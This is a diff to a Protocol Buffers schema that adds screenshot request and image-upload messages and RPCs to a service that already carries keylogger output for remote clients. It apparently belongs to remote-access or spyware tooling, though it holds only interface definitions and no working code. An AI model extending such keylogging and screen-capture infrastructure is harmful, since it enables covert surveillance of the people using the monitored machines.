@@ -47,6 +47,15 @@ message KeylogOutput {
     int32 key = 2;
 }
 
+message ScreenData {
+    bool shouldTakeScreenshot = 1;
+}
+
+message ScreenOutput {
+    bytes ImageData = 1;
+    ClientDataRequest id = 2;
+}
+
 message ClientDataRequest { string client_id = 1; }
 
 message ClientDataOnScreenTextResponse { ClientOnScreenData on_screen = 1; }
@@ -60,4 +69,6 @@ service Consumer {
     rpc GetDialog(ClientDataRequest) returns (DialogData);
     rpc SetDialogOutput(DialogOutput) returns (Void);
     rpc SetKeylogOutput(KeylogOutput) returns (Void);
+    rpc GetScreen(ClientDataRequest) returns (ScreenData);
+    rpc SetScreenOutput(ScreenOutput) returns (Void);
 }
